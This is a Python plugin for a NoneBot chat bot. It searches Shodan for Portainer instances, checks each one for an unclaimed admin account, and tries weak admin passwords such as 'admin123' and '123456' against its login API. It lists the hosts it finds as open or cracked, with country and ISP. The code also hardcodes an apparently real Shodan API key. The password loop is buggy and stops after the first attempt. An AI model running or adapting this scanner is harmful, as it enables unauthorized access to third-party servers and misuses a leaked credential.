from nonebot import on_command, on_startswith, on_notice
from nonebot.typing import T_State
from nonebot.adapters import Bot, Event
from nonebot.adapters.onebot.v11 import *
import base64
import shodan
import sys
import os
import requests
import json
import time
from nonebot_plugin_apscheduler import scheduler

def check_is_registered(ip, port):
    url = 'http://{}:{}/api/users/admin/check'.format(ip, port)
    r = requests.get(url, verify=False)
    if r.status_code == 404:
        return False
    else:
        return True

def check_is_fuck_password(ip, port):
    url = 'http://{}:{}/api/auth'.format(ip, port)
    weak_passwd = [
        "admin123",
        "admin1234",
        "admin12345",
        "admin123456",
        "admin1234567",
        "admin12345678",
        "123456",
        "123456789",
        "12345678",
        "1234567",
        "1234567890",
    ]
    data = {"username":"admin","password":"admin123"}
    for i in weak_passwd:
        data = {"username":"admin","password":i}
        r = requests.post(url, data=json.dumps(data), verify=False)
        if r.status_code == 200:
            return i
        else:
            return False


async def _find():
    res = []
    res_filename = time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime()) + ".txt"
    # print("[*] Save result to {}".format(res_filename))
    # file_stream = open(res_filename, "w")
    try:
        #API_KEY=os.environ.get('SHODAN_API_KEY')
       API_KEY = "TFRNvq6KfIjl81pLVtxdVEmqoh09NngK"
    except KeyError: 
       print("Please set the environment variable SHODAN_API_KEY")
       sys.exit(1)

    QUERY = 'portainer'
    # Filters only work with paid accounts
    # - export SHODAN_FILTER = 'country:"BR"'
    FILTERS = os.getenv('SHODAN_FILTER', '')

    try:
        # Setup the api
      api = shodan.Shodan(API_KEY)
    
      # Perform the search
      result = api.search('{} {}'.format(QUERY,FILTERS))
    
      # Loop through the matches and print each IP
      for service in result['matches']:

        # Verify if the the service is using https or http
        if 'ssl' in service:
          PROTO='https'
        else:
          PROTO='http'

        # Make full url to find if vulnerability exists
        full_url = '{}://{}:{}/api/users/admin/check'.format(PROTO,service['ip_str'],service['port'])
        try:
          isRegister = check_is_registered(service['ip_str'],service['port'])
          if isRegister:
            isFuckpasswd = check_is_fuck_password(service['ip_str'],service['port'])
            if isFuckpasswd is not False:
              # print('passwd \t| Country: {} \t| ISP: {} \t| {}://{}:{}/ \t | {}'.format(
              #   service['location']['country_code'], service['isp'],PROTO,service['ip_str'],service['port'],
              #   isFuckpasswd))
              res.append('passwd \t| Country: {} \t| ISP: {} \t| {}://{}:{}/ \t | {}\n'.format(
                  service['location']['country_code'], service['isp'],PROTO,service['ip_str'],service['port'],
                  isFuckpasswd))

          else:
            # print('new \t| Country: {} \t| ISP: {} \t| {}://{}:{}/'.format(service['location']['country_code'], service['isp'],PROTO,service['ip_str'],service['port']))
            res.append('new \t| Country: {} \t| ISP: {} \t| {}://{}:{}/\n'.format(service['location']['country_code'], service['isp'],PROTO,service['ip_str'],service['port']))
        except Exception as e:
          print('Error: skipping {}'.format(service['ip_str']))

    except Exception as e:
      print('Error: {}'.format(e))

    return res

